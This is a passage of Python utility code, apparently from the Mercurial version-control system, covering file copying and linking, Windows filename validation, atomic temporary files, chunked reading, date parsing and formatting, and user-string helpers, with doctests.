            hardlink, num = copyfiles(srcname, dstname, hardlink, num, progress)
    else:
        if hardlink is None:
            hardlink = (
                os.stat(os.path.dirname(src)).st_dev
                == os.stat(os.path.dirname(dst)).st_dev
            )
            if progress:
                progress._topic = _("linking") if hardlink else _("copying")

        if hardlink:
            try:
                oslink(src, dst)
            except (IOError, OSError):
                hardlink = False
                if progress:
                    progress._topic = _("copying")
                shutil.copy(src, dst)
        else:
            shutil.copy(src, dst)
        num += 1
        if progress:
            progress.value = num

    return hardlink, num


_winreservednames = {
    "con",
    "prn",
    "aux",
    "nul",
    "com1",
    "com2",
    "com3",
    "com4",
    "com5",
    "com6",
    "com7",
    "com8",
    "com9",
    "lpt1",
    "lpt2",
    "lpt3",
    "lpt4",
    "lpt5",
    "lpt6",
    "lpt7",
    "lpt8",
    "lpt9",
}
_winreservedchars = ':*?"<>|'


def checkwinfilename(path):
    r"""Check that the base-relative path is a valid filename on Windows.
    Returns None if the path is ok, or a UI string describing the problem.

    >>> checkwinfilename(b"just/a/normal/path")
    >>> checkwinfilename(b"foo/bar/con.xml")
    "filename contains 'con', which is reserved on Windows"
    >>> checkwinfilename(b"foo/con.xml/bar")
    "filename contains 'con', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/xml.con")
    >>> checkwinfilename(b"foo/bar/AUX/bla.txt")
    "filename contains 'AUX', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/bla:.txt")
    "filename contains ':', which is reserved on Windows"
    >>> checkwinfilename(b"foo/bar/b\07la.txt")
    "filename contains '\\x07', which is invalid on Windows"
    >>> checkwinfilename(b"foo/bar/bla ")
    "filename ends with ' ', which is not allowed on Windows"
    >>> checkwinfilename(b"../bar")
    >>> checkwinfilename(b"foo\\")
    "filename ends with '\\', which is invalid on Windows"
    >>> checkwinfilename(b"foo\\/bar")
    "directory name ends with '\\', which is invalid on Windows"
    """
    if path.endswith("\\"):
        return _("filename ends with '\\', which is invalid on Windows")
    if "\\/" in path:
        return _("directory name ends with '\\', which is invalid on Windows")
    for n in path.replace("\\", "/").split("/"):
        if not n:
            continue
        for c in _filenamebytestr(n):
            if c in _winreservedchars:
                return _("filename contains '%s', which is reserved " "on Windows") % c
            if ord(c) <= 31:
                return _(
                    "filename contains '%s', which is invalid " "on Windows"
                ) % escapestr(c)
        base = n.split(".")[0]
        if base and base.lower() in _winreservednames:
            return _("filename contains '%s', which is reserved " "on Windows") % base
        t = n[-1:]
        if t in ". " and n not in "..":
            return _("filename ends with '%s', which is not allowed " "on Windows") % t


if pycompat.iswindows:
    checkosfilename = checkwinfilename
    timer = time.clock
else:
    checkosfilename = platform.checkosfilename
    timer = time.time

if safehasattr(time, "perf_counter"):
    timer = time.perf_counter


if "TESTTMP" in encoding.environ:
    # Stabilize test output
    def timer():
        return 0

    def getuser():
        return "test"


def fstat(fp):
    """stat file object that may not have fileno method."""
    try:
        return os.fstat(fp.fileno())
    except AttributeError:
        return os.stat(fp.name)


# File system features


def fscasesensitive(path):
    """
    Return true if the given path is on a case-sensitive filesystem

    Requires a path (like /foo/.hg) ending with a foldable final
    directory component.
    """
    fstype = getfstype(path)
    if fstype is not None and fscap.getfscap(fstype, fscap.ALWAYSCASESENSITIVE):
        return True
    s1 = os.lstat(path)
    d, b = os.path.split(path)
    b2 = b.upper()
    if b == b2:
        b2 = b.lower()
        if b == b2:
            return True  # no evidence against case sensitivity
    p2 = os.path.join(d, b2)
    try:
        s2 = os.lstat(p2)
        if s2 == s1:
            return False
        return True
    except OSError:
        return True


try:
    from .thirdparty import pyre2 as re2

    re2._re2.escape  # the C module might be missing
    _re2 = None
except ImportError:
    try:
        import re2

        re2._re2.escape  # the C module might be missing
        _re2 = None
    except (AttributeError, ImportError):
        _re2 = False


class _re(object):
    def _checkre2(self):
        global _re2
        try:
            # check if match works, see issue3964
            _re2 = bool(re2.match(r"\[([^\[]+)\]", "[ui]"))
        except ImportError:
            _re2 = False

    def compile(self, pat, flags=0):
        """Compile a regular expression, using re2 if possible

        For best performance, use only re2-compatible regexp features. The
        only flags from the re module that are re2-compatible are
        IGNORECASE and MULTILINE."""
        if _re2 is None:
            self._checkre2()
        if _re2 and (flags & ~(remod.IGNORECASE | remod.MULTILINE)) == 0:
            if flags & remod.IGNORECASE:
                pat = "(?i)" + pat
            if flags & remod.MULTILINE:
                pat = "(?m)" + pat
            try:
                return re2.compile(pat)
            except re2.error:
                pass
        return remod.compile(pat, flags)

    @propertycache
    def escape(self):
        """Return the version of escape corresponding to self.compile.

        This is imperfect because whether re2 or re is used for a particular
        function depends on the flags, etc, but it's the best we can do.
        """
        global _re2
        if _re2 is None:
            self._checkre2()
        if _re2:
            return re2.escape
        else:
            return remod.escape


re = _re()

_fspathcache = {}


def fspath(name, root):
    """Get name in the case stored in the filesystem

    The name should be relative to root, and be normcase-ed for efficiency.

    Note that this function is unnecessary, and should not be
    called, for case-sensitive filesystems (simply because it's expensive).

    The root should be normcase-ed, too.
    """

    def _makefspathcacheentry(dir):
        return dict((normcase(n), n) for n in os.listdir(dir))

    seps = pycompat.ossep
    if pycompat.osaltsep:
        seps = seps + pycompat.osaltsep
    # Protect backslashes. This gets silly very quickly.
    seps.replace("\\", "\\\\")
    pattern = remod.compile(br"([^%s]+)|([%s]+)" % (seps, seps))
    dir = os.path.normpath(root)
    result = []
    for part, sep in pattern.findall(name):
        if sep:
            result.append(sep)
            continue

        if dir not in _fspathcache:
            _fspathcache[dir] = _makefspathcacheentry(dir)
        contents = _fspathcache[dir]

        found = contents.get(part)
        if not found:
            # retry "once per directory" per "dirstate.walk" which
            # may take place for each patches of "hg qpush", for example
            _fspathcache[dir] = contents = _makefspathcacheentry(dir)
            found = contents.get(part)

        result.append(found or part)
        dir = os.path.join(dir, part)

    return "".join(result)


def checknlink(testfile):
    """check whether hardlink count reporting works properly"""

    # Skip checking for known filesystems
    fstype = getfstype(os.path.dirname(testfile))
    if fscap.getfscap(fstype, fscap.HARDLINK) is not None:
        return True

    # testfile may be open, so we need a separate file for checking to
    # work around issue2543 (or testfile may get lost on Samba shares)
    f1, f2, fp = None, None, None
    try:
        fd, f1 = tempfile.mkstemp(
            prefix=".%s-" % os.path.basename(testfile),
            suffix="1~",
            dir=os.path.dirname(testfile),
        )
        os.close(fd)
        f2 = "%s2~" % f1[:-2]

        oslink(f1, f2)
        # nlinks() may behave differently for files on Windows shares if
        # the file is open.
        fp = posixfile(f2)
        return nlinks(f2) > 1
    except OSError:
        return False
    finally:
        if fp is not None:
            fp.close()
        for f in (f1, f2):
            try:
                if f is not None:
                    os.unlink(f)
            except OSError:
                pass


def endswithsep(path):
    """Check path ends with os.sep or os.altsep."""
    return (
        path.endswith(pycompat.ossep)
        or pycompat.osaltsep
        and path.endswith(pycompat.osaltsep)
    )


def splitpath(path):
    """Split path by os.sep.
    Note that this function does not use os.altsep because this is
    an alternative of simple "xxx.split(os.sep)".
    It is recommended to use os.path.normpath() before using this
    function if need."""
    return path.split(pycompat.ossep)


def gui():
    """Are we running in a GUI?"""
    if pycompat.isdarwin:
        if "SSH_CONNECTION" in encoding.environ:
            # handle SSH access to a box where the user is logged in
            return False
        elif getattr(osutil, "isgui", None):
            # check if a CoreGraphics session is available
            return osutil.isgui()
        else:
            # pure build; use a safe default
            return True
    else:
        return pycompat.iswindows or encoding.environ.get("DISPLAY")


def mktempcopy(name, emptyok=False, createmode=None):
    """Create a temporary file with the same contents from name

    The permission bits are copied from the original file.

    If the temporary file is going to be truncated immediately, you
    can use emptyok=True as an optimization.

    Returns the name of the temporary file.
    """
    d, fn = os.path.split(name)
    fd, temp = tempfile.mkstemp(prefix=".%s-" % fn, suffix="~", dir=d)
    os.close(fd)
    # Temporary files are created with mode 0600, which is usually not
    # what we want.  If the original file already exists, just copy
    # its mode.  Otherwise, manually obey umask.
    copymode(name, temp, createmode)
    if emptyok:
        return temp
    try:
        try:
            ifp = posixfile(name, "rb")
        except IOError as inst:
            if inst.errno == errno.ENOENT:
                return temp
            if not getattr(inst, "filename", None):
                inst.filename = name
            raise
        ofp = posixfile(temp, "wb")
        for chunk in filechunkiter(ifp):
            ofp.write(chunk)
        ifp.close()
        ofp.close()
    except:  # re-raises
        try:
            os.unlink(temp)
        except OSError:
            pass
        raise
    return temp


def truncate(fd, offset):
    # Workaround ftruncate returning 1. See
    # https://www.spinics.net/lists/linux-btrfs/msg78417.html
    try:
        fd.truncate(offset)
    except IOError as ex:
        if ex.errno != 0:
            raise


class filestat(object):
    """help to exactly detect change of a file

    'stat' attribute is result of 'os.stat()' if specified 'path'
    exists. Otherwise, it is None. This can avoid preparative
    'exists()' examination on client side of this class.
    """

    def __init__(self, stat):
        self.stat = stat

    @classmethod
    def frompath(cls, path):
        try:
            stat = os.stat(path)
        except OSError as err:
            if err.errno != errno.ENOENT:
                raise
            stat = None
        return cls(stat)

    @classmethod
    def fromfp(cls, fp):
        stat = os.fstat(fp.fileno())
        return cls(stat)

    __hash__ = object.__hash__

    def __eq__(self, old):
        try:
            # if ambiguity between stat of new and old file is
            # avoided, comparison of size, ctime and mtime is enough
            # to exactly detect change of a file regardless of platform
            return (
                self.stat.st_size == old.stat.st_size
                and self.stat.st_ctime == old.stat.st_ctime
                and self.stat.st_mtime == old.stat.st_mtime
            )
        except AttributeError:
            pass
        try:
            return self.stat is None and old.stat is None
        except AttributeError:
            return False

    def isambig(self, old):
        """Examine whether new (= self) stat is ambiguous against old one

        "S[N]" below means stat of a file at N-th change:

        - S[n-1].ctime  < S[n].ctime: can detect change of a file
        - S[n-1].ctime == S[n].ctime
          - S[n-1].ctime  < S[n].mtime: means natural advancing (*1)
          - S[n-1].ctime == S[n].mtime: is ambiguous (*2)
          - S[n-1].ctime  > S[n].mtime: never occurs naturally (don't care)
        - S[n-1].ctime  > S[n].ctime: never occurs naturally (don't care)

        Case (*2) above means that a file was changed twice or more at
        same time in sec (= S[n-1].ctime), and comparison of timestamp
        is ambiguous.

        Base idea to avoid such ambiguity is "advance mtime 1 sec, if
        timestamp is ambiguous".

        But advancing mtime only in case (*2) doesn't work as
        expected, because naturally advanced S[n].mtime in case (*1)
        might be equal to manually advanced S[n-1 or earlier].mtime.

        Therefore, all "S[n-1].ctime == S[n].ctime" cases should be
        treated as ambiguous regardless of mtime, to avoid overlooking
        by confliction between such mtime.

        Advancing mtime "if isambig(oldstat)" ensures "S[n-1].mtime !=
        S[n].mtime", even if size of a file isn't changed.
        """
        try:
            return self.stat.st_ctime == old.stat.st_ctime
        except AttributeError:
            return False

    def avoidambig(self, path, old):
        """Change file stat of specified path to avoid ambiguity

        'old' should be previous filestat of 'path'.

        This skips avoiding ambiguity, if a process doesn't have
        appropriate privileges for 'path'. This returns False in this
        case.

        Otherwise, this returns True, as "ambiguity is avoided".
        """
        advanced = (old.stat.st_mtime + 1) & 0x7FFFFFFF
        try:
            os.utime(path, (advanced, advanced))
        except OSError as inst:
            if inst.errno == errno.EPERM:
                # utime() on the file created by another user causes EPERM,
                # if a process doesn't have appropriate privileges
                return False
            raise
        return True

    def __ne__(self, other):
        return not self == other


class atomictempfile(object):
    """writable file object that atomically updates a file

    All writes will go to a temporary copy of the original file. Call
    close() when you are done writing, and atomictempfile will rename
    the temporary copy to the original name, making the changes
    visible. If the object is destroyed without being closed, all your
    writes are discarded.

    checkambig argument of constructor is used with filestat, and is
    useful only if target file is guarded by any lock (e.g. repo.lock
    or repo.wlock).
    """

    def __init__(self, name, mode="w+b", createmode=None, checkambig=False):
        self.__name = name  # permanent name
        self._tempname = mktempcopy(name, emptyok=("w" in mode), createmode=createmode)
        self._fp = posixfile(self._tempname, mode)
        self._checkambig = checkambig

        # delegated methods
        self.read = self._fp.read
        self.write = self._fp.write
        self.seek = self._fp.seek
        self.tell = self._fp.tell
        self.fileno = self._fp.fileno

    def close(self):
        if not self._fp.closed:
            self._fp.close()
            filename = localpath(self.__name)
            oldstat = self._checkambig and filestat.frompath(filename)
            if oldstat and oldstat.stat:
                rename(self._tempname, filename)
                newstat = filestat.frompath(filename)
                if newstat.isambig(oldstat):
                    # stat of changed file is ambiguous to original one
                    advanced = (oldstat.stat.st_mtime + 1) & 0x7FFFFFFF
                    os.utime(filename, (advanced, advanced))
            else:
                rename(self._tempname, filename)

    def discard(self):
        if not self._fp.closed:
            try:
                os.unlink(self._tempname)
            except OSError:
                pass
            self._fp.close()

    def __del__(self):
        if safehasattr(self, "_fp"):  # constructor actually did something
            self.discard()

    def __enter__(self):
        return self

    def __exit__(self, exctype, excvalue, traceback):
        if exctype is not None:
            self.discard()
        else:
            self.close()


def unlinkpath(f, ignoremissing=False):
    """unlink and remove the directory if it is empty"""
    if ignoremissing:
        tryunlink(f)
    else:
        unlink(f)
    # try removing directories that might now be empty
    try:
        removedirs(os.path.dirname(f))
    except OSError:
        pass


def tryunlink(f):
    """Attempt to remove a file, ignoring ENOENT errors."""
    try:
        unlink(f)
    except OSError as e:
        if e.errno != errno.ENOENT:
            raise


def makedirs(name, mode=None, notindexed=False):
    """recursive directory creation with parent mode inheritance

    Newly created directories are marked as "not to be indexed by
    the content indexing service", if ``notindexed`` is specified
    for "write" mode access.
    """
    try:
        makedir(name, notindexed)
    except OSError as err:
        if err.errno == errno.EEXIST:
            return
        if err.errno != errno.ENOENT or not name:
            raise
        parent = os.path.dirname(os.path.abspath(name))
        if parent == name:
            raise
        makedirs(parent, mode, notindexed)
        try:
            makedir(name, notindexed)
        except OSError as err:
            # Catch EEXIST to handle races
            if err.errno == errno.EEXIST:
                return
            raise
    if mode is not None:
        os.chmod(name, mode)


def readfile(path):
    with open(path, "rb") as fp:
        return fp.read()


def writefile(path, text):
    with open(path, "wb") as fp:
        fp.write(text)


def appendfile(path, text):
    with open(path, "ab") as fp:
        fp.write(text)


class chunkbuffer(object):
    """Allow arbitrary sized chunks of data to be efficiently read from an
    iterator over chunks of arbitrary size."""

    def __init__(self, in_iter):
        """in_iter is the iterator that's iterating over the input chunks."""

        def splitbig(chunks):
            for chunk in chunks:
                if len(chunk) > 2 ** 20:
                    pos = 0
                    while pos < len(chunk):
                        end = pos + 2 ** 18
                        yield chunk[pos:end]
                        pos = end
                else:
                    yield chunk

        self.iter = splitbig(in_iter)
        self._queue = collections.deque()
        self._chunkoffset = 0

    def read(self, l=None):
        """Read L bytes of data from the iterator of chunks of data.
        Returns less than L bytes if the iterator runs dry.

        If size parameter is omitted, read everything"""
        if l is None:
            return "".join(self.iter)

        left = l
        buf = []
        queue = self._queue
        while left > 0:
            # refill the queue
            if not queue:
                target = 2 ** 18
                for chunk in self.iter:
                    queue.append(chunk)
                    target -= len(chunk)
                    if target <= 0:
                        break
                if not queue:
                    break

            # The easy way to do this would be to queue.popleft(), modify the
            # chunk (if necessary), then queue.appendleft(). However, for cases
            # where we read partial chunk content, this incurs 2 dequeue
            # mutations and creates a new str for the remaining chunk in the
            # queue. Our code below avoids this overhead.

            chunk = queue[0]
            chunkl = len(chunk)
            offset = self._chunkoffset

            # Use full chunk.
            if offset == 0 and left >= chunkl:
                left -= chunkl
                queue.popleft()
                buf.append(chunk)
                # self._chunkoffset remains at 0.
                continue

            chunkremaining = chunkl - offset

            # Use all of unconsumed part of chunk.
            if left >= chunkremaining:
                left -= chunkremaining
                queue.popleft()
                # offset == 0 is enabled by block above, so this won't merely
                # copy via ``chunk[0:]``.
                buf.append(chunk[offset:])
                self._chunkoffset = 0

            # Partial chunk needed.
            else:
                buf.append(chunk[offset : offset + left])
                self._chunkoffset += left
                left -= chunkremaining

        return "".join(buf)


def filechunkiter(f, size=2097152, limit=None):
    """Create a generator that produces the data in the file size
    (default 2MB) bytes at a time, up to optional limit (default is
    to read all data).  Chunks may be less than size bytes if the
    chunk is the last chunk in the file, or the file is a socket or
    some other type of file that sometimes reads less data than is
    requested."""
    assert size >= 0
    assert limit is None or limit >= 0
    while True:
        if limit is None:
            nbytes = size
        else:
            nbytes = min(limit, size)
        s = nbytes and f.read(nbytes)
        if not s:
            break
        if limit:
            limit -= len(s)
        yield s


def makedate(timestamp=None):
    """Return a unix timestamp (or the current time) as a (unixtime,
    offset) tuple based off the local timezone."""
    if timestamp is None:
        timestamp = time.time()
    if timestamp < 0:
        hint = _("check your clock")
        raise Abort(_("negative timestamp: %d") % timestamp, hint=hint)
    delta = datetime.datetime.utcfromtimestamp(
        timestamp
    ) - datetime.datetime.fromtimestamp(timestamp)
    tz = delta.days * 86400 + delta.seconds
    return timestamp, tz


def datestr(date=None, format="%a %b %d %H:%M:%S %Y %1%2"):
    """represent a (unixtime, offset) tuple as a localized time.
    unixtime is seconds since the epoch, and offset is the time zone's
    number of seconds away from UTC.

    >>> datestr((0, 0))
    'Thu Jan 01 00:00:00 1970 +0000'
    >>> datestr((42, 0))
    'Thu Jan 01 00:00:42 1970 +0000'
    >>> datestr((-42, 0))
    'Wed Dec 31 23:59:18 1969 +0000'
    >>> datestr((0x7fffffff, 0))
    'Tue Jan 19 03:14:07 2038 +0000'
    >>> datestr((-0x80000000, 0))
    'Fri Dec 13 20:45:52 1901 +0000'
    """
    t, tz = date or makedate()
    if "%1" in format or "%2" in format or "%z" in format:
        sign = (tz > 0) and "-" or "+"
        minutes = abs(tz) // 60
        q, r = divmod(minutes, 60)
        format = format.replace("%z", "%1%2")
        format = format.replace("%1", "%c%02d" % (sign, q))
        format = format.replace("%2", "%02d" % r)
    d = t - tz
    if d > 0x7FFFFFFF:
        d = 0x7FFFFFFF
    elif d < -0x80000000:
        d = -0x80000000
    # Never use time.gmtime() and datetime.datetime.fromtimestamp()
    # because they use the gmtime() system call which is buggy on Windows
    # for negative values.
    t = datetime.datetime(1970, 1, 1) + datetime.timedelta(seconds=d)
    s = encoding.strtolocal(t.strftime(encoding.strfromlocal(format)))
    return s


def shortdate(date=None):
    """turn (timestamp, tzoff) tuple into iso 8631 date."""
    return datestr(date, format="%Y-%m-%d")


def shortdatetime(date=None):
    """turn (timestamp, tzoff) tuple into iso 8631 date and time."""
    return datestr(date, format="%Y-%m-%dT%H:%M:%S")


def parsetimezone(s):
    """find a trailing timezone, if any, in string, and return a
       (offset, remainder) pair"""

    if s.endswith("GMT") or s.endswith("UTC"):
        return 0, s[:-3].rstrip()

    # Unix-style timezones [+-]hhmm
    if len(s) >= 5 and s[-5] in "+-" and s[-4:].isdigit():
        sign = (s[-5] == "+") and 1 or -1
        hours = int(s[-4:-2])
        minutes = int(s[-2:])
        return -sign * (hours * 60 + minutes) * 60, s[:-5].rstrip()

    # ISO8601 trailing Z
    if s.endswith("Z") and s[-2:-1].isdigit():
        return 0, s[:-1]

    # ISO8601-style [+-]hh:mm
    if (
        len(s) >= 6
        and s[-6] in "+-"
        and s[-3] == ":"
        and s[-5:-3].isdigit()
        and s[-2:].isdigit()
    ):
        sign = (s[-6] == "+") and 1 or -1
        hours = int(s[-5:-3])
        minutes = int(s[-2:])
        return -sign * (hours * 60 + minutes) * 60, s[:-6]

    return None, s


def strdate(string, format, defaults=None):
    """parse a localized time string and return a (unixtime, offset) tuple.
    if the string cannot be parsed, ValueError is raised."""
    if defaults is None:
        defaults = {}

    # NOTE: unixtime = localunixtime + offset
    offset, date = parsetimezone(string)

    # add missing elements from defaults
    usenow = False  # default to using biased defaults
    for part in ("S", "M", "HI", "d", "mb", "yY"):  # decreasing specificity
        part = pycompat.bytestr(part)
        found = [True for p in part if ("%" + p) in format]
        if not found:
            date += "@" + defaults[part][usenow]
            format += "@%" + part[0]
        else:
            # We've found a specific time element, less specific time
            # elements are relative to today
            usenow = True

    timetuple = time.strptime(
        encoding.strfromlocal(date), encoding.strfromlocal(format)
    )
    localunixtime = int(calendar.timegm(timetuple))
    if offset is None:
        # local timezone
        unixtime = int(time.mktime(timetuple))
        offset = unixtime - localunixtime
    else:
        unixtime = localunixtime + offset
    return unixtime, offset


def parsedate(date, formats=None, bias=None):
    """parse a localized date/time and return a (unixtime, offset) tuple.

    The date may be a "unixtime offset" string or in one of the specified
    formats. If the date already is a (unixtime, offset) tuple, it is returned.

    >>> parsedate(b' today ') == parsedate(
    ...     datetime.date.today().strftime('%b %d').encode('ascii'))
    True
    >>> parsedate(b'yesterday ') == parsedate(
    ...     (datetime.date.today() - datetime.timedelta(days=1)
    ...      ).strftime('%b %d').encode('ascii'))
    True
    >>> now, tz = makedate()
    >>> strnow, strtz = parsedate(b'now')
    >>> (strnow - now) < 1
    True
    >>> tz == strtz
    True
    """
    if bias is None:
        bias = {}
    if not date:
        return 0, 0
    if isinstance(date, tuple) and len(date) == 2:
        return date
    if not formats:
        formats = defaultdateformats
    date = date.strip()

    if date == "now" or date == _("now"):
        return makedate()
    if date == "today" or date == _("today"):
        date = datetime.date.today().strftime(r"%b %d")
        date = encoding.strtolocal(date)
    elif date == "yesterday" or date == _("yesterday"):
        date = (datetime.date.today() - datetime.timedelta(days=1)).strftime(r"%b %d")
        date = encoding.strtolocal(date)

    try:
        when, offset = map(int, date.split(" "))
    except ValueError:
        # fill out defaults
        now = makedate()
        defaults = {}
        for part in ("d", "mb", "yY", "HI", "M", "S"):
            # this piece is for rounding the specific end of unknowns
            b = bias.get(part)
            if b is None:
                if part[0:1] in "HMS":
                    b = "00"
                else:
                    b = "0"

            # this piece is for matching the generic end to today's date
            n = datestr(now, "%" + part[0:1])

            defaults[part] = (b, n)

        for format in formats:
            try:
                when, offset = strdate(date, format, defaults)
            except (ValueError, OverflowError):
                pass
            else:
                break
        else:
            raise error.ParseError(_("invalid date: %r") % date)
    # validate explicit (probably user-specified) date and
    # time zone offset. values must fit in signed 32 bits for
    # current 32-bit linux runtimes. timezones go from UTC-12
    # to UTC+14
    if when < -0x80000000 or when > 0x7FFFFFFF:
        raise error.ParseError(_("date exceeds 32 bits: %d") % when)
    if offset < -50400 or offset > 43200:
        raise error.ParseError(_("impossible time zone offset: %d") % offset)
    return when, offset


def matchdate(date):
    """Return a function that matches a given date match specifier

    Formats include:

    '{date}' match a given date to the accuracy provided

    '<{date}' on or before a given date

    '>{date}' on or after a given date

    >>> p1 = parsedate(b"10:29:59")
    >>> p2 = parsedate(b"10:30:00")
    >>> p3 = parsedate(b"10:30:59")
    >>> p4 = parsedate(b"10:31:00")
    >>> p5 = parsedate(b"Sep 15 10:30:00 1999")
    >>> f = matchdate(b"10:30")
    >>> f(p1[0])
    False
    >>> f(p2[0])
    True
    >>> f(p3[0])
    True
    >>> f(p4[0])
    False
    >>> f(p5[0])
    False
    """

    def lower(date):
        d = {"mb": "1", "d": "1"}
        return parsedate(date, extendeddateformats, d)[0]

    def upper(date):
        d = {"mb": "12", "HI": "23", "M": "59", "S": "59"}
        for days in ("31", "30", "29"):
            try:
                d["d"] = days
                return parsedate(date, extendeddateformats, d)[0]
            except error.ParseError:
                pass
        d["d"] = "28"
        return parsedate(date, extendeddateformats, d)[0]

    date = date.strip()

    if not date:
        raise Abort(_("dates cannot consist entirely of whitespace"))
    elif date[0] == "<":
        if not date[1:]:
            raise Abort(_("invalid day spec, use '<DATE'"))
        when = upper(date[1:])
        return lambda x: x <= when
    elif date[0] == ">":
        if not date[1:]:
            raise Abort(_("invalid day spec, use '>DATE'"))
        when = lower(date[1:])
        return lambda x: x >= when
    elif date[0] == "-":
        try:
            days = int(date[1:])
        except ValueError:
            raise Abort(_("invalid day spec: %s") % date[1:])
        if days < 0:
            raise Abort(_("%s must be nonnegative (see 'hg help dates')") % date[1:])
        when = makedate()[0] - days * 3600 * 24
        return lambda x: x >= when
    elif " to " in date:
        a, b = date.split(" to ")
        start, stop = lower(a), upper(b)
        return lambda x: x >= start and x <= stop
    else:
        start, stop = lower(date), upper(date)
        return lambda x: x >= start and x <= stop


def stringmatcher(pattern, casesensitive=True):
    """
    accepts a string, possibly starting with 're:' or 'literal:' prefix.
    returns the matcher name, pattern, and matcher function.
    missing or unknown prefixes are treated as literal matches.

    helper for tests:
    >>> def test(pattern, *tests):
    ...     kind, pattern, matcher = stringmatcher(pattern)
    ...     return (kind, pattern, [bool(matcher(t)) for t in tests])
    >>> def itest(pattern, *tests):
    ...     kind, pattern, matcher = stringmatcher(pattern, casesensitive=False)
    ...     return (kind, pattern, [bool(matcher(t)) for t in tests])

    exact matching (no prefix):
    >>> test(b'abcdefg', b'abc', b'def', b'abcdefg')
    ('literal', 'abcdefg', [False, False, True])

    regex matching ('re:' prefix)
    >>> test(b're:a.+b', b'nomatch', b'fooadef', b'fooadefbar')
    ('re', 'a.+b', [False, False, True])

    force exact matches ('literal:' prefix)
    >>> test(b'literal:re:foobar', b'foobar', b're:foobar')
    ('literal', 're:foobar', [False, True])

    unknown prefixes are ignored and treated as literals
    >>> test(b'foo:bar', b'foo', b'bar', b'foo:bar')
    ('literal', 'foo:bar', [False, False, True])

    case insensitive regex matches
    >>> itest(b're:A.+b', b'nomatch', b'fooadef', b'fooadefBar')
    ('re', 'A.+b', [False, False, True])

    case insensitive literal matches
    >>> itest(b'ABCDEFG', b'abc', b'def', b'abcdefg')
    ('literal', 'ABCDEFG', [False, False, True])
    """
    if pattern.startswith("re:"):
        pattern = pattern[3:]
        try:
            flags = 0
            if not casesensitive:
                flags = remod.I
            regex = remod.compile(pattern, flags)
        except remod.error as e:
            raise error.ParseError(_("invalid regular expression: %s") % e)
        return "re", pattern, regex.search
    elif pattern.startswith("literal:"):
        pattern = pattern[8:]

    match = pattern.__eq__

    if not casesensitive:
        ipat = encoding.lower(pattern)
        match = lambda s: ipat == encoding.lower(s)
    return "literal", pattern, match


def shortuser(user):
    """Return a short representation of a user name or email address."""
    f = user.find("@")
    if f >= 0:
        user = user[:f]
    f = user.find("<")
    if f >= 0:
        user = user[f + 1 :]
    f = user.find(" ")
    if f >= 0:
        user = user[:f]
    f = user.find(".")
    if f >= 0:
        user = user[:f]
    return user


def emailuser(user):
    """Return the user portion of an email address."""
    f = user.find("@")
    if f >= 0:
        user = user[:f]
    f = user.find("<")
    if f >= 0:
        user = user[f + 1 :]
    return user


def email(author):
    """get email of author."""
    r = author.find(">")
    if r == -1:
        r = None
    return author[author.find("<") + 1 : r]


def emaildomainuser(user, domain):
    """get email of author, abbreviating users in the given domain."""
    useremail = email(user)
    if domain and useremail.endswith("@" + domain):
        useremail = useremail[: -len(domain) - 1]
    return useremail


def ellipsis(text, maxlength=400):
    """Trim string to at most maxlength (default: 400) columns in display."""
    return encoding.trim(text, maxlength, ellipsis="...")


def unitcountfn(*unittable):
    """return a function that renders a readable count of some quantity"""

    def go(count):
        for multiplier, divisor, format in unittable:
            if abs(count) >= divisor * multiplier:
                return format % (count / float(divisor))
        return unittable[-1][2] % count

    return go


def processlinerange(fromline, toline):
    """Check that linerange <fromline>:<toline> makes sense and return a
    0-based range.

    >>> processlinerange(10, 20)
    (9, 20)
    >>> processlinerange(2, 1)
    Traceback (most recent call last):
        ...
    ParseError: line range must be positive
    >>> processlinerange(0, 5)
    Traceback (most recent call last):
        ...
    ParseError: fromline must be strictly positive
    """
    if toline - fromline < 0:
        raise error.ParseError(_("line range must be positive"))
    if fromline < 1:
        raise error.ParseError(_("fromline must be strictly positive"))
    return fromline - 1, toline


bytecount = unitcountfn(
    (100, 1 << 30, _("%.0f GB")),
    (10, 1 << 30, _("%.1f GB")),
    (1, 1 << 30, _("%.2f GB")),
    (100, 1 << 20, _("%.0f MB")),
    (10, 1 << 20, _("%.1f MB")),
    (1, 1 << 20, _("%.2f MB")),
    (100, 1 << 10, _("%.0f KB")),
    (10, 1 << 10, _("%.1f KB")),
    (1, 1 << 10, _("%.2f KB")),
    (1, 1, _("%.0f bytes")),
)

# Matches a single EOL which can either be a CRLF where repeated CR
# are removed or a LF. We do not care about old Macintosh files, so a
# stray CR is an error.
_eolre = remod.compile(br"\r*\n")


def tolf(s):
    return _eolre.sub("\n", s)


def tocrlf(s):
    return _eolre.sub("\r\n", s)


if pycompat.oslinesep == "\r\n":
    tonativeeol = tocrlf
    fromnativeeol = tolf
else:
    tonativeeol = pycompat.identity
    fromnativeeol = pycompat.identity


def escapestr(s):
    # call underlying function of s.encode('string_escape') directly for
    # Python 3 compatibility
    return codecs.escape_encode(s)[0]


def unescapestr(s):
    return codecs.escape_decode(s)[0]


def forcebytestr(obj):
    """Portably format an arbitrary object (e.g. exception) into a byte
    string."""
    try:
        return pycompat.bytestr(obj)
    except UnicodeEncodeError:
        # non-ascii string, may be lossy
        return pycompat.bytestr(encoding.strtolocal(str(obj)))


def uirepr(s):
    # Avoid double backslash in Windows path repr()
    return repr(s).replace("\\\\", "\\")


# delay import of textwrap
def MBTextWrapper(**kwargs):
    class tw(textwrap.TextWrapper):
        """
        Extend TextWrapper for width-awareness.

        Neither number of 'bytes' in any encoding nor 'characters' is
        appropriate to calculate terminal columns for specified string.

        Original TextWrapper implementation uses built-in 'len()' directly,
        so overriding is needed to use width information of each characters.

        In addition, characters classified into 'ambiguous' width are
        treated as wide in East Asian area, but as narrow in other.

        This requires use decision to determine width of such characters.
        """

        def _cutdown(self, ucstr, space_left):
            l = 0
            colwidth = encoding.ucolwidth
            for i in xrange(len(ucstr)):
                l += colwidth(ucstr[i])
                if space_left < l:
                    return (ucstr[:i], ucstr[i:])
            return ucstr, ""

        # overriding of base class
        def _handle_long_word(self, reversed_chunks, cur_line, cur_len, width):
            space_left = max(width - cur_len, 1)

            if self.break_long_words:
                cut, res = self._cutdown(reversed_chunks[-1], space_left)
                cur_line.append(cut)
                reversed_chunks[-1] = res
            elif not cur_line:
                cur_line.append(reversed_chunks.pop())

        # this overriding code is imported from TextWrapper of Python 2.6
        # to calculate columns of string by 'encoding.ucolwidth()'
        def _wrap_chunks(self, chunks):
            colwidth = encoding.ucolwidth

            lines = []
            if self.width <= 0:
                raise ValueError("invalid width %r (must be > 0)" % self.width)

            # Arrange in reverse order so items can be efficiently popped
            # from a stack of chucks.
